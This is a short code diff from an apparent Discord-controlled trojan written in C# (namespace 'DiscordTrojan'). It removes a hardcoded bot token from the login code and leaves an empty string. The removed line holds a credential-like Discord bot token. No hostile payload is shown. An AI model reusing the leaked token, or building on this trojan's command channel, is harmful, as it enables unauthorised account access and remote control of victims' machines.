@@ -77,7 +77,7 @@ namespace DiscordTrojan
             _client.MessageReceived += CommandHandler;
             _client.Log += Log;
 
-            var token = "NjEzMDIxNjg0Njg5MjcyODMz.GPnEht.NIZ4EkEALBeAGMMULwg_xoGOZWbZOzOq-8C4Os";
+            var token = "";
             
             await _client.LoginAsync(TokenType.Bot, token);
             await _client.StartAsync();
